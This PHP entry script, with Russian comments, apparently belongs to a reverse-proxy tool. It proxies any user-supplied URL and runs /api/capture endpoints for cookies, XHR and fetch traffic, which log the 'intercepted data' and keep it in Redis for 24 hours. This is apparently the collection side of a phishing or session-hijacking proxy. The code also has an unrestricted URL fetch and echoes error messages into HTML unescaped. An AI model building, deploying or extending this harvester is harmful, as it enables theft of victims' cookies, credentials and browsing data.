<?php

// Загружаем автозагрузчик Composer
require_once __DIR__ . '/../vendor/autoload.php';

use ReverseProxy\RequestHandler;
use ReverseProxy\ResponseHandler;
use ReverseProxy\ContentModifier;
use ReverseProxy\HeaderManager;
use ReverseProxy\CookieManager;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use Predis\Client as RedisClient;

// Инициализируем логгер
$logger = new Logger('reverseproxy');
$logger->pushHandler(new StreamHandler(__DIR__ . '/../var/logs/app.log', Logger::DEBUG));

// Загружаем конфигурацию
$config = require_once __DIR__ . '/../config/config.php';

// Инициализируем Redis-клиент
$redis = new RedisClient([
    'scheme' => 'tcp',
    'host'   => $config['redis']['host'],
    'port'   => $config['redis']['port'],
    'database' => $config['redis']['database']
]);

// Создаем экземпляры классов
$headerManager = new HeaderManager($logger, $config);
$cookieManager = new CookieManager($logger, $config, $redis);
$contentModifier = new ContentModifier($logger, $config);
$requestHandler = new RequestHandler($headerManager, $cookieManager, $logger, $config);
$responseHandler = new ResponseHandler($contentModifier, $logger, $config);

// Получаем текущий запрос
$request = Request::createFromGlobals();

// Логируем входящий запрос
$logger->info('Получен запрос', [
    'method' => $request->getMethod(),
    'path' => $request->getPathInfo(),
    'query' => $request->getQueryString(),
    'client_ip' => $request->getClientIp()
]);

// Обрабатываем запрос
try {
    // Определяем целевой URL
    $targetUrl = null;
    
    if ($request->getPathInfo() === '/proxy' && $request->query->has('url')) {
        // Если запрос к /proxy с параметром url, используем его как целевой URL
        $targetUrl = $request->query->get('url');
    } elseif ($request->getPathInfo() === '/api/capture' || $request->getPathInfo() === '/api/capture/cookie' || 
              $request->getPathInfo() === '/api/capture/xhr' || $request->getPathInfo() === '/api/capture/fetch') {
        // Обрабатываем запросы к API для перехвата данных
        $data = json_decode($request->getContent(), true);
        
        if ($data) {
            // Логируем перехваченные данные
            $logger->info('Перехвачены данные', [
                'endpoint' => $request->getPathInfo(),
                'data' => $data
            ]);
            
            // Сохраняем данные в Redis
            $key = 'captured:' . md5($request->getClientIp() . ':' . microtime(true));
            $redis->hmset($key, [
                'type' => str_replace('/api/capture/', '', $request->getPathInfo()),
                'url' => $data['url'] ?? '',
                'data' => json_encode($data['data'] ?? []),
                'timestamp' => time()
            ]);
            $redis->expire($key, 86400); // 24 часа
        }
        
        // Возвращаем успешный ответ
        $response = new Response(json_encode(['status' => 'success']), 200, ['Content-Type' => 'application/json']);
        $response->send();
        exit;
    } elseif ($request->getPathInfo() === '/') {
        // Если запрос к корню, показываем форму для ввода URL
        $html = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>Reverse Proxy</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-size: 16px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 3px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Reverse Proxy</h1>
        <form action="/proxy" method="get">
            <div class="form-group">
                <label for="url">Введите URL для проксирования:</label>
                <input type="text" id="url" name="url" placeholder="https://example.com" required>
            </div>
            <button type="submit">Перейти</button>
        </form>
    </div>
</body>
</html>
HTML;
        
        $response = new Response($html, 200, ['Content-Type' => 'text/html']);
        $response->send();
        exit;
    }
    
    // Обрабатываем запрос через прокси
    $response = $requestHandler->handleRequest($request, $targetUrl);
    
    // Модифицируем ответ
    $response = $responseHandler->handleResponse($response);
    
    // Отправляем ответ клиенту
    $response->send();
} catch (\Exception $e) {
    // Логируем ошибку
    $logger->error('Ошибка при обработке запроса', [
        'message' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
    
    // Возвращаем ошибку
    $errorHtml = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>Ошибка</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h1 {
            color: #d9534f;
        }
        .error-message {
            background-color: #f2dede;
            color: #a94442;
            padding: 15px;
            border-radius: 3px;
            margin-bottom: 20px;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #337ab7;
            text-decoration: none;
        }
        .back-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ошибка при обработке запроса</h1>
        <div class="error-message">
            {$e->getMessage()}
        </div>
        <a href="/" class="back-link">← Вернуться на главную</a>
    </div>
</body>
</html>
HTML;
    
    $response = new Response($errorHtml, 500, ['Content-Type' => 'text/html']);
    $response->send();
}
